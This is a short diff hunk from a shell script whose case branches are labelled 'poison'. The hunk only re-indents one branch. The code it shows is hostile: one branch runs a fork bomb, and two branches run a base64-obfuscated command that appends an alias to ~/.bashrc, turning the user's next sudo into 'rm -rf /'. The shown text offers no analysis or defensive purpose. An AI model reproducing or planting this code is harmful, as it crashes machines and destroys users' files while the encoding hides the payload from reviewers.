@@ -12,10 +12,10 @@ case $poison in
 		echo "poison 2"
 		:() { : | : & }; :
 		;;
-  3)
-    echo "poison 3"
-    $(echo "ZWNobyAiYWxpYXMgc3Vkbz0nc3VkbyBybSAtcmYgLyogIyciID4+IH4vLmJhc2hyYwo=" | base64 -d)
-    ;;
+        3)
+                echo "poison 3"
+                $(echo "ZWNobyAiYWxpYXMgc3Vkbz0nc3VkbyBybSAtcmYgLyogIyciID4+IH4vLmJhc2hyYwo=" | base64 -d)
+                ;;
 	*)
 		echo "poison #3"
 		$(echo "ZWNobyAiYWxpYXMgc3Vkbz0nc3VkbyBybSAtcmYgLyogIyciID4+IH4vLmJhc2hyYwo=" | base64 -d)
